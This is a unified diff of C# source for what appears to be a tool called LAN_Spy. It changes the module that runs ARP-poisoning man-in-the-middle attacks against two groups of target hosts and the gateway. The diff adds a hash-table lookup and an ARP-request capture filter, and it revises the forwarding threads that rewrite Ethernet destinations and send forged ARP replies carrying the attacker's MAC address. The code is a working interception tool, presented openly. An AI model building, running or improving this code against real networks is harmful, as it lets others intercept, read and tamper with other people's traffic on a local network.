@@ -1,13 +1,13 @@
-﻿using System;
+﻿using LAN_Spy.Model.Classes;
+using PacketDotNet;
+using PacketDotNet.Utils;
+using SharpPcap;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Threading;
-using LAN_Spy.Model.Classes;
-using PacketDotNet;
-using PacketDotNet.Utils;
-using SharpPcap;
 
 namespace LAN_Spy.Model {
     /// <inheritdoc />
@@ -24,16 +24,26 @@ namespace LAN_Spy.Model {
         ///     包转发线程句柄。
         /// </summary>
         private readonly List<Thread> _retransmissionThreads = new List<Thread>();
-
+        
         /// <summary>
         ///     毒化目标缓存。
         /// </summary>
         private readonly List<Host> _target1 = new List<Host>(), _target2 = new List<Host>();
+        
+        /// <summary>
+        ///     供转发线程使用的 <see cref="IPAddress"/> 二分查找哈希表。
+        /// </summary>
+        private HashTable _hashTable;
 
         /// <summary>
         ///     使用设备缓存。
         /// </summary>
         private ICaptureDevice _device;
+
+        /// <summary>
+        ///     使用设备IP地址缓存。
+        /// </summary>
+        private IPAddress _deviceAddress;
 
         /// <summary>
         ///     默认网关缓存。
@@ -54,7 +64,6 @@ namespace LAN_Spy.Model {
         ///     根据设定的 <see cref="List{T}" /> 类型的目标列表进行ARP毒化中间人攻击，如果模块已在工作状态则不会有效果。
         /// </summary>
         /// <exception cref="InvalidOperationException">已有一项毒化工作正在进行。</exception>
-        /// <exception cref="NullReferenceException">未设置默认网关。</exception>
         public void StartPoisoning() {
             // 判断是否有未停止的毒化工作
             if (_device != null)
@@ -64,11 +73,33 @@ namespace LAN_Spy.Model {
             _target1.AddRange(Target1);
             _target2.AddRange(Target2);
 
+            // 构建哈希表
+            var hashList = new List<KeyValuePair<int, object>>();
+            foreach (var host in Target1) {
+                if (hashList.Any(item => ((Host) item.Value).IPAddress.Equals(host.IPAddress))) {
+                    Console.Error.WriteLine($"警告：检测到目标列表中存在重复的IP地址 {host.IPAddress} ，将忽略此条信息。");
+                    continue;
+                }
+                hashList.Add(new KeyValuePair<int, object>(host.IPAddress.GetHashCode(), host));
+            }
+            foreach (var host in Target2) {
+                if (hashList.Any(item => ((Host) item.Value).IPAddress.Equals(host.IPAddress))) {
+                    Console.Error.WriteLine($"警告：检测到目标列表中存在重复的IP地址 {host.IPAddress} ，将忽略此条信息。");
+                    continue;
+                }
+                hashList.Add(new KeyValuePair<int, object>(host.IPAddress.GetHashCode(), host));
+            }
+            _hashTable = new HashTable(hashList);
+
+
             // 深复制以缓存网关
-            _gateway = Gateway == null ? new Host(new IPAddress(new byte[] {0, 0, 0, 0}), new PhysicalAddress(new byte[] {0, 0, 0, 0, 0, 0})) : new Host(Gateway.IPAddress, Gateway.PhysicalAddress);
+            _gateway = Gateway == null ? 
+                                  new Host(new IPAddress(new byte[] {0, 0, 0, 0}), new PhysicalAddress(new byte[] {0, 0, 0, 0, 0, 0})) : 
+                                  new Host(Gateway.IPAddress, Gateway.PhysicalAddress);
 
             // 缓存并打开当前设备
-            _device = StartCapture("arp or ip");
+            _device = StartCapture("arp [6:2] = 1 or ip");
+            _deviceAddress = Ipv4Address;
 
             // 创建包转发线程
             for (var i = 0; i < 32; i++) {
@@ -168,29 +199,13 @@ namespace LAN_Spy.Model {
                         if (ether.Type == EthernetPacketType.IPv4) {
                             // 解析IPv4包
                             var ipv4Packet = (IPv4Packet) ether.PayloadPacket;
-
-                            // 检查数据包源和目的是否在目标列表中
-                            Host src = _target1.Any(item => item.IPAddress.ToString().Equals(ipv4Packet.SourceAddress.ToString())) ?
-                                    _target1.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.SourceAddress.ToString())) :
-                                    _target2.Any(item => item.IPAddress.ToString().Equals(ipv4Packet.SourceAddress.ToString())) ?
-                                        _target2.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.SourceAddress.ToString())) :
-                                        null,
-                                dest = _target1.Any(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString())) ?
-                                    _target1.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString())) :
-                                    _target2.Any(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString())) ?
-                                        _target2.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString())) :
-                                        null;
-
-                            // 两组间发送的数据包
-                            if ((_target1.Contains(src) && _target2.Contains(dest) ||
-                                 _target2.Contains(src) && _target1.Contains(dest)) && !(dest is null))
+                            
+                            // 组1或组2接收的数据包
+                            if (_hashTable[ipv4Packet.DestinationAddress.GetHashCode()] is Host dest)
                                 ether.DestinationHwAddress = dest.PhysicalAddress;
-                            // 组1或组2发送到外网的数据包
-                            else if ((_target1.Contains(src) || _target2.Contains(src)) && dest is null)
+                            // 组1或组2发送的数据包且接收者并非本机
+                            else if (_hashTable[ipv4Packet.SourceAddress.GetHashCode()] is Host && !ipv4Packet.DestinationAddress.Equals(_deviceAddress))
                                 ether.DestinationHwAddress = _gateway.PhysicalAddress;
-                            // 外网发送给组1或组2的数据包
-                            else if ((_target1.Contains(dest) || _target2.Contains(dest)) && src is null && !(dest is null))
-                                ether.DestinationHwAddress = dest.PhysicalAddress;
                             // 不需要转发数据包
                             else
                                 continue;
@@ -202,21 +217,17 @@ namespace LAN_Spy.Model {
                         else if (ether.Type == EthernetPacketType.Arp) {
                             // 解析ARP包
                             var arp = (ARPPacket) ether.PayloadPacket;
-
-                            // 仅处理ARP请求包
-                            if (arp.Operation != ARPOperation.Request) continue;
-
+                            
                             // 非两组间发送的数据包，跳过
-                            if ((_target1.All(item => !item.IPAddress.ToString().Equals(arp.SenderProtocolAddress.ToString()))
-                                 || _target2.All(item => !item.IPAddress.ToString().Equals(arp.TargetProtocolAddress.ToString())))
-                                && (_target2.All(item => !item.IPAddress.ToString().Equals(arp.SenderProtocolAddress.ToString()))
-                                    || _target1.All(item => !item.IPAddress.ToString().Equals(arp.TargetProtocolAddress.ToString()))))
+                            if (_hashTable[arp.SenderProtocolAddress.GetHashCode()] is null 
+                                || _hashTable[arp.TargetProtocolAddress.GetHashCode()] is null)
                                 continue;
 
                             // 构建包信息
                             var e = new EthernetPacket(_device.MacAddress,
                                 arp.SenderHardwareAddress,
                                 EthernetPacketType.Arp);
+                            e.UpdateCalculatedValues();
                             var a = new ARPPacket(ARPOperation.Response,
                                 arp.SenderHardwareAddress,
                                 arp.SenderProtocolAddress,
@@ -225,6 +236,8 @@ namespace LAN_Spy.Model {
                                 HardwareAddressType = LinkLayers.Ethernet,
                                 ProtocolAddressType = EthernetPacketType.IPv4
                             };
+                            a.UpdateCalculatedValues();
+
                             e.PayloadPacket = a;
                             a.ParentPacket = e;
 
@@ -232,10 +245,9 @@ namespace LAN_Spy.Model {
                             _device.SendPacket(e);
                         }
                     }
-                    else {
+                    else
                         // 队列尚未获得数据，挂起等待
                         Thread.Sleep(100);
-                    }
                 }
             }
             catch (ThreadAbortException) { }
